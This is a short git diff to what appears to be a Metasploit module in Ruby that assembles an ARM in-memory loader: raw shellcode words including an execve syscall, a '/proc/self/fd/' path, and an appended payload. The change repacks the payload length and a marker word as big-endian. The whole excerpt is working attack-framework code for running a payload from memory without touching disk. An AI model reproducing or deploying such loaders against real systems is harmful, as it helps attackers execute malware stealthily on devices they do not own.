@@ -78,11 +78,8 @@ module MetasploitModule
       0x0b70a0e3, # 0x1094:	mov	r7, #0xb	0x0b70a0e3
       0x000000ef, # 0x1098:	svc	#0	0x000000ef
       0xe0ffffeb, # 0x109c:	bl	#0x1024	0xe0ffffeb
-
-      payload.length,
-      0x00000123 # .word
     ].pack('V*')
     fd_path = '/proc/self/fd/'.bytes.pack('C*') + "\x00" * 16
-    in_memory_loader + fd_path + payload
+    in_memory_loader + [payload.length, 0x00000123].pack('N*') + fd_path + payload
   end
 end
